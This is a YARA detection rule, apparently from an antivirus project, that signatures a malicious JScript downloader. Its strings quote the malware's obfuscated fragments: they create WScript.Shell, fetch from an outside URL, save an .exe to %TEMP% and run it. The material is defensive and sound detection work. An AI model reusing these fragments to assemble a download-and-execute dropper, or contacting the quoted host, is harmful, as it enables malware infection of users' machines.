rule sig_20160328_fe11958038919a088af05d317200baee {
  meta:
    description = "datamaliciousorder - file 20160328_fe11958038919a088af05d317200baee.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ed20fc6412a6b4803f49cc1529e1be04f2fcbe32f001294794d3d598e5914eea"

  strings:
    $s1  = "function Hxazpfpgyq() {return Payxdv[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"xT3DcrgVF.exe\";};" fullword ascii
    $s2  = "do {WScript[Yjxuou](Wqdmk() * 11)} while (Wbxkpl[\"readystate\"] < 4 );" fullword ascii
    $s3  = "function Wszgcwxt(Cgdmulapj, Awkaxbu){return Cgdmulapj - Awkaxbu;};" fullword ascii
    $s4  = "var Payxdv = function Hkbvoevtvz() {return WScript[Xxrcs](\"WScript.Shell\");}();" fullword ascii
    $s5  = "Wbxkpl[Cwklretz](\"GET\", \"http://www.stopeugenicsnow.eu/m8dhs\", false);" fullword ascii
    $s6  = "function Ywuijo(Kiyrnj){Payxdv[\"Run\"](Kiyrnj, Pmkudldkh, Pmkudldkh);};" fullword ascii
    $s7  = "function Ywuhounlrs() {return ((Fsdwf == true) && (Fsdwf == Aumvpupps)) ? 1 : Pmkudldkh;};" fullword ascii
    $s8  = "var Nbghidyag = false;" fullword ascii
    $s9  = " while (Fpbgm){" fullword ascii
    $s10 = "var Aumvpupps = false;" fullword ascii
    $s11 = "function Ysuzvldyr(){return Oxtqmh;};" fullword ascii
    $s12 = "var Fsdwf = false;" fullword ascii
    $s13 = "function Vtpcfjv(Qxdnkmxz) {var Llzkxwoq = (1, 2, 3, 4, 5, Qxdnkmxz); return Llzkxwoq;};" fullword ascii
    $s14 = "var Dqhkz = new this[\"Date\"]();" fullword ascii
    $s15 = "Fsdwf = true; " fullword ascii
    $s16 = "function Szewjjydkn()" fullword ascii
    $s17 = "function Vrbqpev(){return Xxrcs;};" fullword ascii
    $s18 = "Aumvpupps = true; " fullword ascii
    $s19 = "function Wqdmk(){return 22;};" fullword ascii
    $s20 = "return Wszgcwxt(Voabx, Gqbbwiz);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}